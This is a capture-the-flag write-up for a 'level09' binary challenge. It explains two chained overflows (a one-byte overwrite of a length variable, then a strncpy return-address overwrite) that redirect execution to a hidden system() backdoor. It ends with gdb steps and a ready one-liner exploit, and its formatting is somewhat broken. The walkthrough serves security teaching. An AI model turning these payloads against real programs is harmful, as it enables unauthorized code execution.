<h1 align="center"> LEVEL 9 </h1>

how it satarted
print("A"*40 + "\xff\x00\x00\x00")

### Function List
```
0x000000000000088c  secret_backdoor  ← Our target
0x00000000000008c0  handle_msg
0x0000000000000932  set_msg
0x00000000000009cd  set_username
0x0000000000000aa8  main
```
Source Code Analysis
Main Function

```c
cundefined8 main(void) {
    puts("--------------------------------------------\n"
         "| ~Welcome to l33t-m$n ~ v1337             |\n"
         "--------------------------------------------");
    handle_msg();
    return 0;
}
Flow: main() → handle_msg() → set_username() → set_msg() → return to main

Handle Message Function
void handle_msg(void) {
    undefined1 local_c8 [140];  // Buffer at rbp-0xc0
    undefined8 local_3c;
    undefined8 local_34;
    undefined8 local_2c;
    undefined8 local_24;
    undefined8 local_1c;
    undefined4 local_14;         // Size variable at rbp-0xc
    
    local_3c = 0;
    local_34 = 0;
    local_2c = 0;
    local_24 = 0;
    local_1c = 0;
    local_14 = 0x8c;            // ← Default size: 140 bytes
    
    set_username(local_c8);      // Pass buffer address
    set_msg(local_c8);           // Pass same buffer address
    puts(">: Msg sent!");
    return;
}
```

Key Points:

- Allocates 0xc0 (192) bytes on stack
- Buffer starts at rbp-0xc0
- Size variable at rbp-0xc initialized to 0x8c (140)
- Both functions receive pointer to same buffer


Set Username Function

```c
void set_username(long param_1) {
    char local_98 [140];         // Local buffer (140 bytes)
    int local_c;
    
    // Zero out local buffer
    // ... (initialization code)
    
    puts(">: Enter your username");
    printf(">>: ");
    fgets(local_98, 0x80, _stdin);  // Read up to 128 bytes
    
    // Copy username to buffer + 0x8c offset
    for (local_c = 0; (local_c < 0x29 && (local_98[local_c] != '\0')); local_c++) {
        *(char *)(param_1 + 0x8c + (long)local_c) = local_98[local_c];
    }
    
    printf(">: Welcome, %s", param_1 + 0x8c);
    return;
}
```
Key Points:

- Reads up to 0x80 (128) bytes from stdin
- Copies up to 0x29 (41) bytes to param_1 + 0x8c
- Vulnerability #1: Loop copies 41 bytes starting at offset 0x8c
- Can overflow from param_1 + 0x8c to param_1 + 0x8c + 0x29 = param_1 + 0xb5
- This allows overwriting the size variable at param_1 + 0xb4!


Set Message Function
```c
void set_msg(char *param_1) {
    char local_408 [1024];       // Large local buffer
    
    // Zero out local buffer
    // ... (initialization code)
    
    puts(">: Msg @Unix-Dude");
    printf(">>: ");
    fgets(local_408, 0x400, _stdin);  // Read up to 1024 bytes
    
    // Copy message using SIZE from param_1+0xb4
    strncpy(param_1, local_408, (long)*(int *)(param_1 + 0xb4));
    return;
}
```
Key Points:

- Reads up to 0x400 (1024) bytes into local buffer
- Calls strncpy(param_1, local_408, SIZE)
- SIZE is read from param_1 + 0xb4 ← This is the size variable!
- Vulnerability #2: If SIZE is large, strncpy overflows param_1 buffer
- Can overwrite return address if SIZE ≥ 0xd0 (208 bytes)


Secret Backdoor Function
```c
void secret_backdoor(void) {
    char local_88 [128];
    
    fgets(local_88, 0x80, _stdin);   // Read command
    system(local_88);                 // Execute command!
    return;
}

```

**Key Points**:
- **Never called in normal execution**
- Reads input and passes it to `system()`
- This is our target - gives arbitrary command execution!

---

## Vulnerability Identification

```
1. set_username(): Buffer overflow at offset 0x8c
   ↓
2. Overwrites size variable at offset 0xb4
   ↓
3. set_msg(): Uses corrupted size in strncpy()
   ↓
4. Large size causes buffer overflow
   ↓
5. Overwrites return address on stack
   ↓
6. Redirects execution to secret_backdoor()
```
The exploit relies on **two connected vulnerabilities**:

- First overflow can't reach return address (only 41 bytes)
- Second overflow is limited by size variable (default 140 bytes isn't enough)

---

## Memory Layout

### Stack Layout in handle_msg()
```
High Memory
                    ┌─────────────────────┐
    rbp+8:          │  Return Address     │ ← TARGET (overwrite to 0x55555555488c)
                    ├─────────────────────┤
    rbp:            │  Saved RBP          │
                    ├─────────────────────┤
    rbp-0xc:        │  Size Variable      │ ← 0x8c => 140 (default), overwrite to ≥ 0xd0 => 208
                    │  (local_14)         │
                    ├─────────────────────┤
    rbp-0x34:       │  Username Start     │ ← Written by set_username at param_1+0x8c
                    │  (param_1+0x8c)     │
                    ├─────────────────────┤
    rbp-0xc0:       │  Buffer Start       │ ← param_1 (strncpy destination)
                    │  (local_c8)         │
Low Memory          └─────────────────────┘
```

### Detailed Offset Calculations

From buffer start (`param_1` = `rbp-0xc0`):

| Offset from param_1 | Offset from rbp | Description | Value/Notes |
|---------------------|-----------------|-------------|-------------|
| +0x00 | rbp-0xc0 | Buffer start | strncpy destination |
| +0x8c | rbp-0x34 | Username start | Written by set_username |
| +0xb4 | rbp-0x0c | Size variable | Default: 0x8c, Need: ≥0xd0 |
| +0xc0 | rbp+0x00 | Saved RBP | - |
| +0xc8 | rbp+0x08 | Return address | Target: secret_backdoor |

### Key Distance Calculations
```
Username start to size variable:
  0xb4 - 0x8c = 0x28 (40 bytes)
  → Need 40 bytes + 1 byte to overwrite size

Buffer start to return address:
  0xc8 bytes (200 bytes)
  → Need 200 bytes padding + 8 bytes address
  → Total: 208 bytes minimum
  → Size must be ≥ 0xd0 (208)
```

---

## Exploitation Strategy

#### Phase 1: Control the Size Variable

**Input 1 (Username)**:
```
['A' × 40] + [SIZE_BYTE] + ['\n']
     │            │           │
     │            │           └─ Newline to submit
     │            └─ Overwrite size at offset 0x28
     └─ Fill 40 bytes to reach size variable
```

**Memory State After Phase 1**:
```
rbp-0x34:  AAAAAAAAAAAAAAAA... (username)
rbp-0x0c:  0xd4 (new size)     ← Changed from 0x8c!
```

#### Phase 2: Overflow to Return Address

**Input 2 (Message)**:
```
['B' × 200] + [ADDRESS_8_BYTES] + ['\n']
     │              │                │
     │              │                └─ Newline to submit
     │              └─ Overwrite return address
     └─ Padding to reach rbp+8
```

**Memory State After Phase 2**:
```
rbp-0xc0:  BBBBBBBBBBBBBBBB... (200 B's)
rbp+0x08:  0x55555555488c     ← Return address overwritten!
```


Address Calculation

gdb ./level09
(gdb) break main
(gdb) run
(gdb) print &secret_backdoor
# Output: $1 = (void (*)()) 0x55555555488c <secret_backdoor>
Full Address: 0x55555555488c
```

Output:
```
Dump of assembler code for function secret_backdoor:
   0x000055555555488c <+0>:  push   %rbp
   0x000055555555488d <+1>:  mov    %rsp,%rbp
   ...
```

### Understanding PIE Addresses

**PIE (Position Independent Executable)** means the binary is loaded at a randomized base address:
```
Binary File Offset:  0x88c
PIE Base Address:    0x555555554000  (randomized by ASLR)
Runtime Address:     0x555555554000 + 0x88c = 0x55555555488c
```

**Important**: If PIE is disabled, the address would be:
```
Base Address:        0x400000  (fixed)
Runtime Address:     0x400000 + 0x88c = 0x40088c
Finding the Current Base Address
```bash
# While program is running:
cat /proc/$(pidof level09)/maps | grep level09
```

### Little-Endian Encoding
```bash
Component 1: Username Payload
username = 'A' * 40        # Fill 40 bytes
username += '\xd4'         # Size = 212 (0xd4) extra byte
username += '\n'           # Newline to submit
Why 40 bytes?

Username written at param_1 + 0x8c
Size variable at param_1 + 0xb4
Distance: 0xb4 - 0x8c = 0x28 (40 bytes)

Why '\xd4' (212)?

Need to reach rbp+8 from rbp-0xc0
Distance: 0xc8 = 200 bytes
Plus 8 bytes for address = 208 bytes minimum
0xd4 = 212 bytes (safe margin)

Alternative Size Values:

\xd0 (208) - Minimum required
\xd4 (212) - Safe with margin
\xff (255) - Plenty of room
\xff\xff (65535) - Maximum (2 bytes)

Component 2: Message Payload

message = 'B' * 200                              # Padding
message += '\x8c\x48\x55\x55\x55\x55\x00\x00'    # Address
message += '\n'                                  # Newline
Why 200 bytes?

Buffer at rbp-0xc0
Return address at rbp+8
Distance: 0xc8 = 200 bytes

Address bytes: secret_backdoor in little-endian

```
```bash
### Debugging Guide
Step 1: Verify Stack Layout
gdb ./level09
(gdb) break handle_msg
(gdb) run
(gdb) info frame
# Check rbp value

(gdb) x/40gx $rbp-0xc0
# Examine buffer area

(gdb) x/gx $rbp-0xc
# Check size variable (should be 0x8c initially)
Step 2: Test Username Overflow
bashgdb ./level09
(gdb) break set_username
(gdb) run

# Input: 40 A's + '\xd4'
(gdb) continue

(gdb) x/gx $rbp-0xc
# Should show 0xd4 after set_username completes
Step 3: Test Message Overflow
bash(gdb) break set_msg
(gdb) continue

# Input: 200 B's + address
(gdb) finish
(gdb) x/gx $rbp+8

# Should show secret_backdoor address
Step 4: Verify Return Address Overwrite
(gdb) break *set_msg+154  # Before ret instruction
(gdb) continue
(gdb) x/i $rbp+8
(gdb) stepi

```

Final Exploit
```bash
(python -c "print 40 * 'a' + '\xff' + '\n' + 'a' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'"; cat) | ./level09
```
